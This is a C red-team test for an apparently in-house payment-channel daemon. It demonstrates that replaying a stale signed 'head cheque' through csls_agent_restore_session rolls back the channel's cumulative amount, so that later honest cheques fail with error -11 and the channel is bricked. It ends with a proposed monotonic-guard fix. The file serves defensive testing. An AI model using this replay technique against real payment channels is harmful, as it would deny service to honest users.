// SPDX-License-Identifier: Apache-2.0
//
// RED TEAM — P3: csls_agent_restore_session called mid-life (not only at boot).
// The restart handshake has NO monotonic guard: a stale (or malicious) source
// of the "head cheque" — e.g. an outdated vendor frontend, a captured old
// handshake, a MITM replaying a legit old cheque — regresses the channel's
// cumulative_sent. Every subsequent cheque then carries a cumulative BELOW the
// vendor's accumulated_amount -> -11 storm -> channel bricked.
// The global watermark height is untouched (nonce safety holds) — this is a
// pure AVAILABILITY break of the honest agent's channel.
//
// Build (gate command):
//   gcc -O2 -Isrc -DCSLS_NO_MAIN test/c/test_redteam_handshake.c \
//       src/causal_daemon.c src/schnorr_bloodhound.c -lcrypto -lpthread -o /tmp/rt_hand
#include <stdio.h>
#include <string.h>
#include "causal_daemon.h"

int main(void) {
    csls_crypto_global_init();
    uint8_t ask[32], vsk[32], v2sk[32];
    memset(ask, 0x51, 32); memset(vsk, 0x22, 32); memset(v2sk, 0x23, 32);
    csls_vendor_ctx_t *V = csls_vendor_new(vsk, 100000000ULL);
    csls_agent_ctx_t *A = csls_agent_new(ask, NULL);
    const uint8_t *vpk = V->pk;

    printf("======================================================================\n");
    printf(" P3: restore_session mid-life -> cumulative regression -> -11 brick\n");
    printf("======================================================================\n");

    // Life: 3 cheques (cum 10000..30000), all accepted.
    csls_cheque_pkt_t ch[3], more;
    for (int i = 0; i < 3; i++) {
        csls_agent_sign_cheque(A, vpk, 10000, &ch[i]);
        csls_vendor_process_cheque(V, &ch[i], NULL);
    }
    csls_cheque_pkt_t stale_head = ch[0];   // h=1, cum=10000 (old frontend snapshot)

    // Agent keeps streaming: cum 40000, 50000. Vendor accumulated = 50000.
    for (int i = 0; i < 2; i++) {
        csls_agent_sign_cheque(A, vpk, 10000, &more);
        csls_vendor_process_cheque(V, &more, NULL);
    }
    uint64_t cum_before;
    csls_agent_get_channel_state(A, vpk, NULL, &cum_before);
    printf("[pre]     agent channel cumulative=%llu, vendor accumulated=%llu\n",
           (unsigned long long)cum_before, 50000ULL);

    // ---- Controls: defenses that DO work ----
    csls_cheque_pkt_t foreign = ch[2], forged = ch[2];
    uint8_t v2pk[33];
    csls_vendor_ctx_t *V2 = csls_vendor_new(v2sk, 100000000ULL);
    memcpy(v2pk, V2->pk, 33);
    memcpy(foreign.vendor_pk, v2pk, 33);
    printf("[control] foreign head (other vendor pk): rc=%d (expect -7)\n",
           csls_agent_restore_session(A, vpk, &foreign));
    forged.challenge_e[0] ^= 0xFF; // break signature
    printf("[control] fabricated head (never signed): rc=%d (expect -5)\n",
           csls_agent_restore_session(A, vpk, &forged));

    // ---- ATTACK: mid-life restore from a STALE head ----
    printf("[debug]   stale_head.height=%llu stale_head.cumulative_amt=%llu\n",
           (unsigned long long)stale_head.height, (unsigned long long)stale_head.cumulative_amt);
    int rs = csls_agent_restore_session(A, vpk, &stale_head);
    uint64_t cum_after = 0, h_after = 0;
    csls_agent_get_channel_state(A, vpk, &h_after, &cum_after);
    printf("[attack]  stale head accepted mid-life: rc=%d\n", rs);
    printf("[attack]  channel after restore: height=%llu (was 5) cumulative=%llu (was 50000)\n",
           (unsigned long long)h_after, (unsigned long long)cum_after);

    // ---- Consequence: -11 brick ----
    int brick = 0;
    for (int i = 0; i < 5; i++) {
        csls_cheque_pkt_t p;
        csls_agent_sign_cheque(A, vpk, 1000, &p);
        int rc = csls_vendor_process_cheque(V, &p, NULL);
        if (rc == -11) brick++;
    }
    printf("[attack]  subsequent honest cheques rejected with -11: %d/5 -> channel BRICKED\n",
           brick);
    // global watermark height untouched (nonce safety holds):
    printf("[attack]  global leased height unaffected (nonce safety intact): next h=%llu\n",
           (unsigned long long)atomic_load(&A->height));

    // ---- double restore with the same stale head: still bricked ----
    csls_agent_restore_session(A, vpk, &stale_head);
    csls_cheque_pkt_t p;
    csls_agent_sign_cheque(A, vpk, 1000, &p);
    printf("[attack]  double restore -> next cheque rc=%d\n",
           csls_vendor_process_cheque(V, &p, NULL));

    printf("======================================================================\n");
    printf(" VERDICT: restore_session lacks a monotonic guard (head->cumulative_amt\n"
           " >= chan->cumulative_sent). Availability break; nonce safety NOT affected.\n"
           " One-line fix for Blue Team: reject restore when head is older than the\n"
           " channel's current state (and rate-limit/lock restore to boot only).\n");

    csls_agent_free(A);
    csls_vendor_free(V); csls_vendor_free(V2);
    csls_crypto_global_cleanup();
    return 0;
}
